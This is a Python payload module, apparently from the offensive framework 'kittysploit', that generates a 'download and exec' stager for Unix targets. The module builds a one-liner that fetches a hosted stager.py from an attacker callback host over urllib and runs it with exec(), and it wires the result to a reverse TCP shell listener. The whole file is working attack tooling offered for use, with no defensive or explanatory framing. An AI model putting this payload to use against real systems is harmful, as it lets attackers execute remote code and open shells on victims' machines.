#!/usr/bin/env python3
# -*- coding: utf-8 -*-

from kittysploit import *

from lib.c2.download_stagers import build_stager_url


class Module(Payload):
    CLIENT_LANGUAGE = "python"

    __info__ = {
        "name": "Unix Download Stager, python urllib",
        "description": (
            "Download and exec stager via Python urllib — no curl/wget required. "
            "Host stager.py with host_stager generate."
        ),
        "category": PayloadCategory.CMD,
        "platform": Platform.UNIX,
        "listener": "listeners/multi/reverse_tcp",
        "handler": Handler.REVERSE,
        "session_type": SessionType.SHELL,
    }

    lhost = OptString("127.0.0.1", "Callback host", True)
    lport = OptPort(4444, "Callback port", True)
    stager_url = OptString("", "Full URL of hosted Python stager", False)
    stager_port = OptInteger(8000, "HTTP port when stager_url empty", False, advanced=True)
    python_binary = OptString("python3", "Python on target", False)

    def generate(self):
        url = str(self.stager_url or "").strip()
        if not url:
            url = build_stager_url(str(self.lhost), int(self.stager_port or 8000), "/stager.py")
            print_info(f"stager_url not set — using {url}")
        script = (
            "import urllib.request,sys;"
            f"exec(urllib.request.urlopen({url!r},timeout=30).read().decode())"
        )
        return self._encode_python_one_liner(script, self.python_binary)
